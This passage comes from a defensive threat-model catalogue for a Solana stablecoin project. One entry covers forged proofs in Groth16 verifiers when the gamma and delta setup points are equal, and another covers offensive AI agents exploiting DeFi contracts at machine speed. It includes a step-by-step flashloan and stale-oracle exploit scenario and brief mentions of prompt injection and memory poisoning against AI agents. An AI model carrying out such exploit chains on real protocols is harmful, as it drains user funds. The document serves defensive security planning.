vk.delta2 = Pairing.G2Point(  // SAME as gamma2 вАФ fatal
    [0x1234..., 0x5678...],
    [0xabcd..., 0xef01...]
);

// SAFE: gamma and delta must be distinct toxic waste commitments from ceremony
// Verify: vk.gamma2 != vk.delta2 (different points); ceremony outputs match compiled circuit
```
**On-chain detection**:
```bash
# Read deployed verifier contract storage; compare gamma2 and delta2 field values
# They must not be equal (as G2Point coordinates)
cast call $VERIFIER_ADDRESS "verifyingKey()(tuple)" | grep -E "gamma|delta"
# Also: compare deployed bytecode constants against ceremony output transcript
```
**Microstable relevance**: вЬЕ **NOT APPLICABLE (current)** вАФ Microstable is a Solana-native oracle-collateralized stablecoin with no ZK proof verifier. Groth16 setup misconfiguration cannot affect the current codebase. **FUTURE WATCH**: If ZK privacy/proof components are ever integrated (e.g., ZK oracle attestation, privacy-preserving mint/redeem), mandate:
1. Third-party ceremony verification: independent audit of setup parameters (`gamma2 вЙ† delta2`, correct circuit hash, Powers of Tau transcript)
2. Published setup transcript with third-party attestation before deployment
3. On-chain verifier parameter storage that can be read and cross-checked against ceremony output
4. Canary test: write an explicit test that confirms a forged proof (no deposit) is rejected
**Defense**:
1. **Ceremony verification**: Never deploy a ZK verifier without third-party verification of the trusted setup outputs (gamma2 вЙ† delta2, correct Powers of Tau, circuit constraint hash matches)
2. **Audit scope extension**: ZK-protocol audits must include verifying key inspection, not just Solidity code review
3. **Setup transcript publication**: Publish ceremony transcripts publicly; require external parties to verify before mainnet deploy
4. **Forged-proof CI test**: Add a test that generates a fake proof (invalid witness) and confirms the verifier rejects it
5. **Post-mortem copycat window**: After a ZK exploit is public, treat all same-setup ZK protocols as HIGH-PRIORITY targets within 72h (copycat attacker pattern confirmed)
**Source**: https://rekt.news/the-unfinished-proof | https://rekt.news/default-settings | https://www.quillaudits.com/blog/hack-analysis/foomcash-exploit-explained | https://blog.zksecurity.xyz/posts/groth16-setup-exploit/

| A49 ZK Groth16 Trusted Setup Ceremony Misconfiguration | ZK verifierмЭШ gamma2==delta2 (лПЩмЭЉ нГАмЫРк≥°мД† м†Р)мЬЉл°Ь мЭЄнХЬ Groth16 soundness мЩДм†Д лґХкіі. мљФлУЬ к∞РмВђк∞А Solidity л°ЬмІБлІМ к≤АнЖ†нХШк≥† л∞∞нПђлРЬ verifying key нММлЭЉлѓЄнД∞л•Љ к≤Ам¶ЭнХШмІА мХКмЬЉл©і л∞Ьк≤ђ лґИк∞А. мШИмєШ мЧЖмЭі мЮДмЭШ nullifierл°Ь мЬ†нЪ®нХЬ proof мЬДм°∞ к∞АлК• вЖТ лђінХЬ мЭЄмґЬ. мДЄл¶ђл®ЄлЛИ мХДмЫГнТЛ м†Ь3мЮР к≤Ам¶Э нХДмИШ. FoomCash $2.26M, Veil Cash (2026-02-26). |

### B49. AI-Speed Adversary Latency Assumption Violation
**Signal**: Cecuro AI Security Research (2026-03): Purpose-built offensive AI agents execute end-to-end exploits on **72% of known-vulnerable contracts**. Baseline GPT-5.1 coding agent detects 34% of vulnerabilities; domain-specialized AI security agent detects 92%. Stellar Cyber / HelpNet Security (2026-03-03): "persistence, autonomy, and scale" вАФ attackers have industrialized agent memory, tool access, and inter-agent dependencies exploitation. The "attacker AI agents vs defenders AI agents" regime is now confirmed in production DeFi.
**Mechanism**: Existing DeFi defense stacks (Discord alerts, keeper check-in intervals, on-call human response, manual parameter review) are calibrated for human-operated attacks that require minutes to hours to prepare and execute. Purpose-built offensive AI agents operate at a fundamentally different tempo:
1. **Parallel contract scanning**: probe thousands of contracts simultaneously to identify exploitable state
2. **Condition convergence detection**: continuously monitor for the precise block/slot where multiple vulnerability conditions converge (stale oracle + boundary collateral + keeper gap + flash loan availability)
3. **Sub-second exploit execution**: once conditions detected, full exploit chain (flashloan вЖТ manipulate вЖТ extract вЖТ repay) executes in a single transaction вАФ before any human-speed alert can be acted on
4. **Copycat acceleration**: FoomCash/Veil Cash pattern confirmed вАФ once a ZK setup exploit is published, AI generates adapted exploits for same-tech protocols within hours, not days
**Why distinct from B37вАУB48** (all AI vectors):
- B37: adversary steganographically evades *within* the defense AI agent
- B38: multi-turn injection into AI agent tool return handling
- B43: memory/log poisoning to steer AI reasoning
- B46: non-adversarial normal operation risk (no attacker)
- B48: browser-localhost gateway takeover
- **B49**: EXTERNAL AI attacker operating at machine speed vs a protocol defended at human-response speed вАФ **temporal asymmetry, not prompt/memory manipulation**. The protocol's code and defenses may be correct; the response time assumption is the vulnerability.
**Microstable relevance**: HIGH вАФ all four architecture chains are affected
- **Oracle вЖФ Price вЖФ Mint/Redeem**: Pyth staleness window (e.g., 600 slots ~= 5 min). AI detects staleness event AND collateral boundary condition within the same slot вЖТ single-TX exploit before keeper next run
- **Keeper вЖФ On-chain**: keeper runs every N blocks. AI probes protocol state at each block within the interval, identifies exploitable combinations invisible in steady-state
- **Agent вЖФ Governance вЖФ Parameter**: AI-assisted governance influence (posting, framing, timing) at machine speed can overwhelm human deliberation window
- **Dashboard вЖФ RPC вЖФ On-chain**: AI-driven RPC probing (D35 class) at scale can bypass rate limits through distributed origination
**Specific exploit scenario (Microstable)**:
```
Block N:    AI agent probes вЖТ oracle price stale (slot_age = 595), collateral near threshold
Block N+1:  Staleness guard triggers (slot_age вЙ• 600) вАФ keeper hasn't checked in
Block N+1:  Same block вАФ AI executes: flashloan вЖТ overprice collateral via stale feed вЖТ 
            mint excess stablecoin вЖТ swap вЖТ repay flashloan
Block N+1:  Human Discord alert fires ~30 sec later вАФ exploit already landed
```
**Defense**:
1. **On-chain mechanical circuit breakers**: oracle staleness вЖТ auto-pause mint/redeem (no human in the loop; the chain enforces it)
2. **Keeper heartbeat as invariant**: if keeper has not submitted an uptime proof within X slots, protocol halts вАФ not an alert, a state machine transition
3. **Sub-block response requirement**: any invariant that requires human response after an alert is a structural vulnerability against AI attackers; design for keeper-or-halt, not keeper-or-notify
4. **Adversarial latency assumption**: all timing parameters (staleness limits, keeper intervals, circuit breaker thresholds) must assume an attacker with sub-second reaction time and perfect state visibility
5. **Copycat response SLA**: when any same-tech protocol exploit is published (ZK, oracle, bridge), trigger 24h mandatory review of same attack class in Microstable вАФ no grace period
**Why auditors miss it**: Security audits model human-paced attackers who require preparation time (hours/days) between discovery and exploitation. AI-speed adversarial conditions require that every time window > 0 blocks with exploitable state be treated as a live vulnerability вАФ a fundamentally different security model than what static/manual code audits apply.
**Source**: https://securityboulevard.com/2026/03/purpose-built-ai-security-agent-detected-92-of-defi-contracts-vulnerabilities/ | https://www.helpnetsecurity.com/2026/03/03/enterprise-ai-agent-security-2026/ | Cecuro AI Security Research (2026-03)

| B49 AI-Speed Adversary Latency Assumption Violation | к∞РмВђк∞А "к≥µк≤©мЮРлКФ л∞Ьк≤ђ нЫД мИШ мЛЬк∞Д~мИШ мЭЉ лВімЧР мЛ§нЦЙ" л™®лНЄмЭД мХФлђµм†БмЬЉл°Ь м†Дм†Ь. AI мЧРмЭім†ДнКЄлКФ мИШм≤Ь к≥ДмХљмЭД л≥Сл†ђ мК§мЇФнХШк≥† м°∞к±і мИШл†і(staleness + к≤љк≥Д лЛіл≥і + keeper к≥µл∞±)мЭД лЄФл°Э лЛ®мЬДл°Ь нГРмІАнХі лЛ®мЭЉ TXл°Ь м¶ЙмЛЬ мЛ§нЦЙ. мЭЄк∞Д-мЭСлЛµ-л£®нФД мЭШм°і л∞©мЦі мД§к≥Д(alertвЖТhumanвЖТact)лКФ AI мЖНлПД к≥µк≤©мЮРмЧР кµђм°∞м†БмЬЉл°Ь лђінЪ®. мШ®м≤імЭЄ кЄ∞к≥Дм†Б circuit breaker + keeper heartbeat invariant нХДмИШ. (Cecuro 2026-03: AI agent 72% known-vulnerable к≥ДмХљ мЛ§м†Ь мЭµмК§нФМл°ЬмЮЗ нЩХмЭЄ) |
